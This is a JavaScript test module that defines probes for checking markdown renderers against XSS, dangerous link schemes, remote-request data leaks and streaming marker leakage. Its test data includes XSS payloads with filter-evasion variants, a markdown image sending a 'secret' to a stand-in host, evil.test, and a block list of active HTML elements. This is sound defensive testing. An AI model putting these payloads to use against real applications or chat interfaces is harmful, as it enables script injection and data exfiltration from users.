// The probe table: what is tested, why, where the idea comes from, and how a result is decided.
// Every probe is data plus a pure `judge(records, ctx)` function. run.mjs streams each payload into a fresh
// container and hands the judge one record per (payload, mode). `mode` is "whole" (one write) or "chars" (one character per write).
//
// A payload calls window.__pwn(id) instead of alert(), so a run never blocks. Remote URLs use evil.test, which the harness
// answers with an aborted request and logs. Nothing leaves the machine.

export const MARKER_CHARS = '* _ ` ~ # [ ] | > -';

const EVIL = (r) => r.reqs.filter((q) => q.host !== 'app.test');
const reqText = (rs) => [...new Set(rs.map((q) => `${q.host}${q.path}`))].join(', ');
const fmtList = (xs) => [...new Set(xs)].join(', ');

export const PROBES = [
  {
    id: 'p1-raw-html',
    title: 'Raw HTML that runs script',
    sources: [
      'https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html',
      'https://portswigger.net/web-security/cross-site-scripting/cheat-sheet',
    ],
    oracle:
      'pass: nothing ran, no on* attribute and no active element (script, iframe, object, embed, form, style, meta, svg, math, base, link) appeared in the output at any step. partial: nothing ran, but such an element or attribute is in the DOM. fail: a payload called the sentinel, or a dialog opened. Elements the library draws as its own chrome are subtracted with a plain-text control run.',
    payloads: [
      { id: 'control', md: 'plain words', control: true, modes: ['whole'] },
      { id: 'p1-script', md: "<script>__pwn('p1-script')</script>" },
      { id: 'p1-img', md: '<img src=x onerror="__pwn(\'p1-img\')">' },
      { id: 'p1-img-inline', md: 'a <img src=x onerror="__pwn(\'p1-inline\')"> b' },
      { id: 'p1-svg', md: '<svg onload="__pwn(\'p1-svg\')">' },
      { id: 'p1-iframe', md: '<iframe srcdoc="<script>parent.__pwn(\'p1-iframe\')</script>">' },
    ],
    judge(records) {
      const control = records.find((r) => r.payload === 'control');
      const base = new Set(control ? control.seen.tags : []);
      const rs = records.filter((r) => !r.control);
      const fired = rs.flatMap((r) => [...r.fired, ...Array(r.dialogs).fill('dialog')]);
      if (fired.length) return { result: 'fail', detail: `ran: ${fmtList(fired)}` };
      const tags = rs.flatMap((r) => r.seen.tags.filter((t) => ACTIVE.has(t) && !base.has(t)));
      const on = rs.flatMap((r) => r.seen.on);
      if (tags.length || on.length) {
        return { result: 'partial', detail: `nothing ran, but the DOM held: ${fmtList([...tags.map((t) => `<${t}>`), ...on])}` };
      }
      return { result: 'pass', detail: 'nothing ran, no on* attribute, no active element' };
    },
  },
  {
    id: 'p2-link-schemes',
    title: 'Dangerous link schemes',
    sources: [
      'https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html',
      'https://portswigger.net/web-security/cross-site-scripting/cheat-sheet',
    ],
    oracle:
      'Static scan of every resolved a.href protocol at every step, plus a real click on every link after the stream ends (target removed first). pass: all inert. partial: no javascript: link, but a data: or vbscript: href was kept. fail: a javascript: href exists, or a click ran script. A javascript: href that React replaced by its throwing stub counts as blocked.',
    payloads: [
      { id: 'p2-js', md: "[x](javascript:__pwn('p2-js'))", click: true },
      // Percent-encoded parentheses: some parsers cut a destination at the first ")", and the browser decodes them in a javascript: URL.
      { id: 'p2-js-enc', md: '[x](javascript:__pwn%28%27p2-js-enc%27%29)', click: true },
      { id: 'p2-case', md: '[x](JaVaScRiPt:__pwn%28%27p2-case%27%29)', click: true },
      { id: 'p2-tab', md: '[x](java&#x09;script:__pwn%28%27p2-tab%27%29)', click: true },
      { id: 'p2-vb', md: '[x](vbscript:msgbox(1))', click: true },
      { id: 'p2-data', md: "[x](data:text/html,<script>__pwn('p2-data')</script>)", click: true },
      { id: 'p2-auto', md: "<javascript:__pwn('p2-auto')>", click: true },
    ],
    judge(records) {
      const protos = (r) => [
        ...r.seen.urls.filter((u) => u.startsWith('a[href]')).map((u) => u.slice(7)),
        ...r.anchors.map((a) => a.proto),
      ];
      const fired = records.flatMap((r) => [
        ...r.fired,
        ...r.opens.filter((o) => /^\s*javascript:/i.test(o)).map(() => `window.open javascript:`),
        ...Array(r.dialogs).fill('dialog'),
      ]);
      const js = records.filter((r) => protos(r).includes('javascript:')).map((r) => r.payload);
      if (fired.length || js.length) {
        const bits = [];
        if (js.length) bits.push(`javascript: href kept for ${fmtList(js)}`);
        if (fired.length) bits.push(`ran: ${fmtList(fired)}`);
        return { result: 'fail', detail: bits.join('; ') };
      }
      const kept = records.flatMap((r) =>
        protos(r)
          .filter((p) => p === 'data:' || p === 'vbscript:')
          .map((p) => `${p} (${r.payload})`),
      );
      if (kept.length) return { result: 'partial', detail: `javascript: blocked, but kept ${fmtList(kept)}` };
      return { result: 'pass', detail: 'no javascript:, vbscript: or data: link survived; clicks were inert' };
    },
  },
  {
    id: 'p3-remote-html',
    title: 'Remote request from raw HTML',
    sources: [
      'https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/',
      'https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/',
    ],
    oracle: 'pass: no request left the page without a click. fail: any request to evil.test, at any step.',
    payloads: [
      { id: 'p3-block', md: '<img src="https://evil.test/p3">' },
      { id: 'p3-inline', md: 'a <img src="https://evil.test/p3i"> b' },
    ],
    judge(records) {
      const reqs = records.flatMap(EVIL);
      if (reqs.length) return { result: 'fail', detail: `requested ${reqText(reqs)} without a click` };
      return { result: 'pass', detail: 'no request without a click' };
    },
  },
  {
    id: 'p4-remote-md-image',
    title: 'Remote request from a markdown image',
    sources: [
      'https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/',
      'https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/',
    ],
    oracle:
      'pass: no request without a click (nothing rendered, or a click-to-load placeholder). fail: any request to evil.test, at any step (a half-typed URL counts).',
    payloads: [{ id: 'p4-img', md: '![x](https://evil.test/leak?q=secret)' }],
    judge(records) {
      const reqs = records.flatMap(EVIL);
      if (reqs.length) return { result: 'fail', detail: `requested ${reqText(reqs)} without a click` };
      const shown = records.some((r) => r.imgs.length);
      return { result: 'pass', detail: shown ? 'img element present but nothing was requested' : 'no request without a click' };
    },
  },
  {
    id: 'p5-link-target',
    title: 'Link target and rel',
    diagnostic: true,
    sources: ['https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Attributes/rel/noopener'],
    oracle:
      'Diagnostic only. pass: the link has no target, or target=_blank with noopener. partial: target=_blank without rel noopener. Streamdown draws links as buttons, which has no anchor to inspect.',
    payloads: [{ id: 'p5-link', md: '[x](https://ok.test/)' }],
    judge(records) {
      const as = records.flatMap((r) => r.anchors);
      if (!as.length) return { result: 'pass', detail: 'no anchor element in the output' };
      const bad = as.filter((a) => a.tag === 'a' && /_blank/i.test(a.target || '') && !/noopener|noreferrer/i.test(a.rel || ''));
      const a = as[0];
      const desc = a.tag === 'button' ? 'button, no anchor' : `target=${a.target ?? 'none'} rel=${a.rel ?? 'none'}`;
      if (bad.length) return { result: 'partial', detail: `target=_blank without noopener (${desc})` };
      return { result: 'pass', detail: desc };
    },
  },
  {
    id: 'p6-markers',
    title: 'Raw markdown markers while streaming',
    sources: [],
    oracle: `Ten short documents, one construct each, written with letters only, so the final text contains none of ${MARKER_CHARS}. Each is streamed one character at a time. A construct leaks if any of those characters is in the container text after any write. A construct whose final text still has a marker was not rendered by the library at all, and counts as n/a, not as a leak. pass: 0 leaks. partial: 1 to 3. fail: 4 or more. The thresholds are provisional, the raw counts are the result. Marked and react-markdown are not streaming-aware, so the result says how they behave when used as documented.`,
    payloads: [
      { id: 'emphasis', md: 'some *quiet words* here', modes: ['chars'] },
      { id: 'strong', md: 'some **loud words** here', modes: ['chars'] },
      { id: 'code span', md: 'run `code span` now', modes: ['chars'] },
      { id: 'fenced code', md: '```\nfenced code\n```\n', modes: ['chars'] },
      { id: 'heading', md: '# Big heading\n', modes: ['chars'] },
      { id: 'link', md: 'see [the link](https://ok.test/page) now', modes: ['chars'] },
      { id: 'list', md: '- first item\n- second item\n', modes: ['chars'] },
      { id: 'blockquote', md: '> quoted words here\n', modes: ['chars'] },
      { id: 'table', md: '| left | right |\n| --- | --- |\n| one | two |\n', modes: ['chars'] },
      { id: 'strikethrough', md: 'some ~~struck words~~ here', modes: ['chars'] },
    ],
    judge(records) {
      const na = records.filter((r) => r.finalMarker).map((r) => r.payload);
      const rendered = records.filter((r) => !r.finalMarker);
      const leaked = rendered.filter((r) => r.leakStep !== null);
      const n = rendered.length;
      const k = leaked.length;
      if (!n) return { result: 'error', detail: 'no construct was rendered, nothing to measure', leaked: 0, constructs: 0 };
      const result = k === 0 ? 'pass' : k <= 3 ? 'partial' : 'fail';
      const parts = [`${k} of ${n} constructs leaked`];
      if (k) parts.push(`leaked: ${leaked.map((r) => `${r.payload} (${JSON.stringify(r.leakCh)})`).join(', ')}`);
      if (na.length) parts.push(`n/a (not rendered): ${na.join(', ')}`);
      return { result, detail: parts.join('; '), leaked: k, constructs: n };
    },
  },
];

const ACTIVE = new Set([
  'script',
  'iframe',
  'frame',
  'frameset',
  'object',
  'embed',
  'applet',
  'form',
  'style',
  'meta',
  'svg',
  'math',
  'base',
  'link',
]);

export const COMMONMARK = {
  id: 'p7-commonmark',
  title: 'CommonMark 0.31.2 conformance',
  sources: ['https://spec.commonmark.org/0.31.2/', 'https://spec.commonmark.org/0.31.2/spec.json'],
  oracle:
    'All 652 examples of the spec, each written in one write, ended, and compared with the expected HTML after the same lenient normaliser for every library (tag structure plus whitespace-collapsed text, attributes ignored). Library-specific normaliser rules are listed in canon.mjs. The denominator is 652 for every library. Also recorded: a strict count (serialised HTML equal with whitespace between tags removed) and a text-only count. Informational, not a pass or fail.',
};
